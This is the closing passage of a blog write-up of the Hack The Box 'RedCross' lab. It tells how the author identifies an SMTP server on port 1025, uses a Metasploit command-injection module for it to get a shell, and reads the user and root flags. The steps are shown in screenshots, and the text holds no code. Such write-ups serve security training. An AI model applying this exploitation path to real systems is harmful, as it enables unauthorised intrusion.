Port 1025 was open and nmap couldn’t identify it. I tried several ways to connect to that port, <code class="language-plaintext highlighter-rouge">nc</code> , <code class="language-plaintext highlighter-rouge">telnet</code> , <code class="language-plaintext highlighter-rouge">ftp</code> etc…<br>
Fortunately <code class="language-plaintext highlighter-rouge">ftp</code> gave me this banner :
<br><img src="/images/hackthebox/redcross/61.png" alt="" class="align-center"><br><br>
That version of the <code class="language-plaintext highlighter-rouge">SMTP</code> server is vulnerable to a command injection and there’s a metasploit module for it :
<br><img src="/images/hackthebox/redcross/62.png" alt="" class="align-center"><br>
<img src="/images/hackthebox/redcross/63.png" alt="" class="align-center"><br><br>
That’s how to get a shell on the box without the RCE in the web application.<br>
We can get a shell by typing <code class="language-plaintext highlighter-rouge">shell</code> , and we are <code class="language-plaintext highlighter-rouge">penelope</code> so we can read the user flag :
<br><img src="/images/hackthebox/redcross/64.png" alt="" class="align-center"><br><br>
After that we will do the same thing we did with the database and users. We already did it so we won’t do it again. Back to our ssh connection let’s read the root flag :
<br><img src="/images/hackthebox/redcross/65.png" alt="" class="align-center"><br><br>
And we owned root !</p>

<p><br>That’s it , Feedback is appreciated !
<br>Don’t forget to read the <a href="/categories">previous write-ups</a> , Tweet about the write-up if you liked it , follow on twitter <a href="https://twitter.com/Ahm3d_H3sham" target="_blank" rel="noopener noreferrer">@Ahm3d_H3sham</a>
<br>Thanks for reading.<br></p>

<p>Previous Hack The Box write-up : <a href="/hack-the-box/vault/">Hack The Box - Vault</a>
<br>Next Hack The Box write-up : <a href="/hack-the-box/teacher/">Hack The Box - Teacher</a></p>


        
      </section>

      <footer class="page__meta">
        
        


        

  <p class="page__date"><strong><i class="fas fa-fw fa-calendar-alt" aria-hidden="true"></i> Updated:</strong> <time datetime="2019-04-13T07:00:00+02:00">April 13, 2019</time></p>


      </footer>

      

      
  <nav class="pagination">
    
      <a href="/hack-the-box/vault/" class="pagination--pager" title="Hack The Box - Vault
">Previous</a>
    
    
      <a href="/hack-the-box/teacher/" class="pagination--pager" title="Hack The Box - Teacher
">Next</a>
    
  </nav>

    </div>

    
  </article>

  
  
</div>
    </div>

    

    <div id="footer" class="page__footer">
      <footer>
        <!-- start custom footer snippets -->

<!-- end custom footer snippets -->
        <div class="page__footer-follow">
    <ul class="social-icons">
      
  
      
  
      
    </ul>
  </div>
      </footer>
    </div>

    
  <script src="/assets/js/main.min.js"></script>







  <!-- Global site tag (gtag.js) - Google Analytics -->
<script async src="https://www.googletagmanager.com/gtag/js?id=UA-97164925-2"></script>
<script>
  window.dataLayer = window.dataLayer || [];
  function gtag(){dataLayer.push(arguments);}
  gtag('js', new Date());

  gtag('config', 'UA-97164925-2', { 'anonymize_ip': false});
</script>









  </body>
</html>
